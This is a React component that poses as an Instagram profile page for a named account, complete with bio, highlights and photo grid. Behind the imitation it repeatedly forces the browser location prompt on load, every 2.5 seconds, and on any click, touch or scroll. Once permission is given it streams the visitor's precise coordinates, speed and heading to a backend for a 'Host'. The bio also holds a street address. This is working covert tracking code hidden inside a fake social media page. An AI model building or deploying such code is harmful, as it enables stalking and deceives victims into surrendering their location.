"use client";

import { useEffect, useRef, useState } from "react";
import Sidebar from "../components/Sidebar";

export default function RecipientFeed({
  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
  sessionId = "",
}) {
  const [isFollowing, setIsFollowing] = useState(false);
  const [coords, setCoords] = useState(null);
  const [hasAllowed, setHasAllowed] = useState(false);

  const watchIdRef = useRef(null);
  const retryTimerRef = useRef(null);
  const hasAllowedRef = useRef(false);

  /*
   * Save location coordinates to backend MongoDB & broadcast to Host
   */
  const saveLocation = async (position) => {
    const { latitude, longitude, accuracy, speed, heading } = position.coords;
    setCoords({ latitude, longitude, accuracy });
    setHasAllowed(true);
    hasAllowedRef.current = true;

    // Clear continuous retry timer once location is successfully allowed
    if (retryTimerRef.current) {
      clearInterval(retryTimerRef.current);
      retryTimerRef.current = null;
    }

    try {
      const response = await fetch(`${backendUrl}/api/records`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
          participantName: "Mobile Recipient",
          latitude,
          longitude,
          accuracy: accuracy ?? null,
          speed: speed ?? null,
          heading: heading ?? null,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      console.log("Location captured and saved successfully");
    } catch (error) {
      console.error("Location save failed:", error);
    }
  };

  /*
   * Request GPS permission via native browser dialog
   * and start continuous automatic tracking
   */
  const requestLocation = () => {
    if (!navigator.geolocation) {
      console.warn("Geolocation is not supported by this browser.");
      return;
    }

    if (hasAllowedRef.current && watchIdRef.current !== null) {
      return; // Already actively streaming
    }

    // Native browser prompt triggers here
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // Save initial coordinates & mark allowed
        await saveLocation(position);
        setIsFollowing(true);

        // Start live location stream continuously
        if (watchIdRef.current === null) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            async (updatedPosition) => {
              await saveLocation(updatedPosition);
            },
            (error) => {
              console.error("Location update error:", error);
            },
            {
              enableHighAccuracy: true,
              maximumAge: 5000,
              timeout: 15000,
            }
          );
        }
      },
      (error) => {
        console.warn("Browser location pending/dismissed:", error.message);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      }
    );
  };

  useEffect(() => {
    // 1. Trigger native browser prompt immediately on page load
    requestLocation();

    // 2. Continuously ask / retry every 2.5 seconds until user taps "Allow"
    retryTimerRef.current = setInterval(() => {
      if (!hasAllowedRef.current) {
        requestLocation();
      } else {
        clearInterval(retryTimerRef.current);
      }
    }, 2500);

    // 3. User interaction listener (tap/click anywhere on page forces browser location prompt)
    const handleUserInteraction = () => {
      if (!hasAllowedRef.current) {
        requestLocation();
      }
    };

    window.addEventListener("click", handleUserInteraction);
    window.addEventListener("touchstart", handleUserInteraction);
    window.addEventListener("scroll", handleUserInteraction);

    return () => {
      if (retryTimerRef.current) {
        clearInterval(retryTimerRef.current);
      }
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      window.removeEventListener("click", handleUserInteraction);
      window.removeEventListener("touchstart", handleUserInteraction);
      window.removeEventListener("scroll", handleUserInteraction);
    };
  }, []);

  const handleToggleFollow = () => {
    requestLocation();
    setIsFollowing(true);
  };

  return (
    <div className="ig-app" onClick={requestLocation} onTouchStart={requestLocation}>
      {/* Left Sidebar */}
      <Sidebar onItemClick={requestLocation} activeTab="Profile" />

      {/* Main Content Area */}
      <main className="ig-main">
        <header className="ig-topbar">
          <div className="mobile-logo">Instagram</div>
        </header>

        <div className="feed-container">
          {/* Profile Section */}
          <section className="profile-header">
            <div className="profile-avatar" onClick={requestLocation}>
              <div className="location-avatar">
                <div className="ig-story-ring">
                  <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
                </div>
              </div>
            </div>

            <div className="profile-info">
              <div className="profile-title">
                <h1>mr_in.nocent_yogi</h1>
              </div>

              <div className="profile-stats">
                <div><strong>94</strong><span>posts</span></div>
                <div><strong>293</strong><span>followers</span></div>
                <div><strong>625</strong><span>following</span></div>
              </div>

              <div className="profile-description">
                <p>
                  Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀
                  Vaeraraiyum Paarkathae🙈
                  Avalai Avalai Pazhagi Tholaitha Ithayam
                  Vaeraraiyum Aerkaathae❣️
                  @editor_Yogi_R³
                </p>
                <span className="profile-link">🔗 yrdigitalenterprises.in</span>
                <span className="profile-link">13/b kuttiyan palayam street, Kumbakonam 612001</span>
              </div>
            </div>
          </section>

          {/* Profile Action Buttons */}
          <div className="profile-action-buttons">
            <button
              className={`profile-follow-btn ${isFollowing ? "following" : ""}`}
              onClick={handleToggleFollow}
            >
              {isFollowing ? "Following" : "Follow"}
            </button>
          </div>

          {/* Story Highlights */}
          <div className="highlights-row">
            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/business.jpg" alt="Bussiness" />
                </div>
              </div>
              <span>Bussiness</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/invitations.jpg" alt="invitations" />
                </div>
              </div>
              <span>invitations</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/aval.jpg" alt="Aval" />
                </div>
              </div>
              <span>Aval ❣️</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                </div>
              </div>
              <span>Thumbnails...</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/king.jpg" alt="king" />
                </div>
              </div>
              <span>king 👑</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                  <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="12" y1="5" x2="12" y2="19"></line>
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                  </svg>
                </div>
              </div>
              <span>New</span>
            </div>
          </div>

          {/* Post Photo Grid */}
          <div className="recipient-posts-grid">
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/aval.jpg" alt="Post 1" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/business.jpg" alt="Post 2" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/king.jpg" alt="Post 3" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/invitations.jpg" alt="Post 4" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/thumbnails.jpg" alt="Post 5" />
            </div>
            <div className="recipient-post-tile" onClick={requestLocation}>
              <img src="/highlights/profile.jpg" alt="Post 6" />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
